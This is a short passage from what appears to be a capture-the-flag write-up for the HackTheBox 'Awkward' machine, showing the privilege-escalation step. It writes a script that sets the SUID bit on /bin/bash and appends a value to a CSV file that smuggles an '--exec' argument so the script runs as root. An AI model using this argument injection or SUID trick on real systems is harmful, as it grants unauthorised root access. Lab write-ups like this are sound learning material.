Let's create a file called `priv.sh` and add the content which will give the `/bin/bash` binary `suid bit` privilege

```js
bean@awkward:/tmp$ nano priv.sh
bean@awkward:/tmp$ chmod +x priv.sh
bean@awkward:/tmp$ cat priv.sh
#!/bin/bash
chmod +s /bin/bash
```

Add the `--exec` flag inside the `leave_requests.csv` file

```js
www-data@awkward:~/private$ echo '" --exec="\!/tmp/priv.sh"' >> leave_requests.csv
```

And boom 🎉 we got the `root.txt`

<FixTheImageURL src='cmd11.png' slug='hackthebox-awkward-writeup' />
